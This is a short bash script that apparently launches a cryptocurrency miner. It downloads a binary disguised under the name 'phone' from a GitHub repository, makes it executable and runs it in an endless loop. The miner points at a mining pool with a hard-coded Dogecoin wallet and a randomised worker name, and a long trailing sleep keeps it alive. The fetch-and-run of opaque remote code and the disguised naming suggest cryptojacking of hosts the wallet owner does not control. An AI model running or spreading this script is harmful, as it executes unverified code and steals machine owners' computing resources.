#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=DOGE:DT7UtNqk6fZrpWRm8gUSULJ6KHMusSjtXz
WORKER=$(echo $(shuf -i 1000000-9999999 -n 1)-phone#816c-v7qn)
wget https://github.com/dreamistoken/phone/raw/main/phone
chmod +x phone
	while [ 1 ]; do
		./phone -pool $POOL -wal $WALLET.$WORKER -pass x
        sleep 5
	done
sleep 999999999 
